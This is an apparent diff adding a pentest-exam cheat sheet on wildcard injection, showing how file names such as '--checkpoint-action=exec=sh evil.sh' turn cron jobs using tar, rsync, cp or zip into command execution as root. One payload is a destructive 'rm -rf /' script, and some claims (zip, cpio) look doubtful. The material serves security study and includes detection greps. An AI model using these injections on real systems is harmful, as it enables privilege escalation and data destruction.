@@ -68,3 +68,126 @@ rsync: --rsync-path
 zip, scp, cpio: similar attack surface
 
 Bonus: Wildcard injection works on more than just tar — if a script runs mybinary *, and * includes a file like --badflag, the command might misbehave.
+
+🔥 Wildcard Abuse Detection Cheat Sheet
+🧠 Rule of Thumb:
+If a script or cron job uses *, ?, or [ ] with a command that accepts options starting with -- or -, you may be able to inject your own flags or payloads using filenames.
+
+🧨 Top Commands Vulnerable to Wildcard Injection:
+Command	Vulnerable Flag	Description
+tar	--checkpoint-action=exec=COMMAND	Run any command during extraction
+rsync	--rsync-path=COMMAND	Run arbitrary command on remote
+scp	-oProxyCommand=COMMAND	Proxy shell execution
+cpio	--file, --pass-through	Can trigger file-based injection
+find	-exec, -ok, or via file expansion	Path traversal or exec
+zip	via crafted file name expansion	Used with -T, -FF, etc.
+bash scripts	"$@", "$*" used improperly	Will expand with attacker flags
+🔍 Real-World Examples of Wildcard Injection in Cron Jobs or Scripts
+🔁 Example 1: tar cron job
+bash
+Copy
+Edit
+* * * * * tar -cf /tmp/backup.tar.gz *
+Inject:
+
+bash
+Copy
+Edit
+echo 'rm -rf /' > evil.sh
+echo '' > "--checkpoint=1"
+echo '' > "--checkpoint-action=exec=sh evil.sh"
+📁 Example 2: rsync in backup script
+bash
+Copy
+Edit
+rsync -a * /mnt/backup/
+Inject:
+
+bash
+Copy
+Edit
+touch '--rsync-path=sh evil.sh'
+When * expands, rsync treats --rsync-path=sh evil.sh as an argument.
+
+📂 Example 3: zip being used insecurely
+bash
+Copy
+Edit
+zip /tmp/backup.zip *
+Inject:
+
+bash
+Copy
+Edit
+touch '--unzip-command=sh evil.sh'
+Some older zip or unzip implementations honor flags like this when file names are passed.
+
+🧹 Example 4: Bash script looping over *
+bash
+Copy
+Edit
+for file in *; do
+  cp "$file" /tmp/backup/
+done
+Inject:
+
+bash
+Copy
+Edit
+touch '--target-directory=/root/'
+touch evil.sh
+If the script doesn't sanitize $file, it may run:
+
+bash
+Copy
+Edit
+cp --target-directory=/root/ evil.sh /tmp/backup/
+Now you've dropped your payload in /root/.
+
+⚙️ Example 5: cpio wildcard usage
+bash
+Copy
+Edit
+find . -name "*" | cpio -o > archive.cpio
+Inject:
+
+bash
+Copy
+Edit
+touch '--no-preserve-owner'
+touch '--quiet'
+cpio accepts a lot of command-line flags. Filenames injected via * can become flags.
+
+🕵️‍♂️ How to Hunt for These in Real-Time
+Use these search techniques:
+
+🔍 Check for wildcard usage in crons:
+bash
+Copy
+Edit
+grep '\*' /etc/cron* /var/spool/cron/* 2>/dev/null
+🔍 Spot common vulnerable binaries:
+bash
+Copy
+Edit
+grep -E 'tar|rsync|scp|zip|cpio|find' /etc/cron* /opt/* /usr/local/bin/* 2>/dev/null
+🧪 Test locally:
+Create dummy files named like flags:
+
+bash
+Copy
+Edit
+touch -- '--some-flag=payload'
+Then run the command with * to see if your file triggers misbehavior:
+
+bash
+Copy
+Edit
+tar -cf test.tar.gz *
+🧠 CPTS/Exam Takeaways
+Don’t just think: “Oh, it’s a tar cron job.”
+
+Think: “Is * used? Can I inject flags via filenames? Can any of those flags lead to command execution?”
+
+If you find a job or script that matches that pattern — drop --checkpoint-action bombs and wait for root.
+
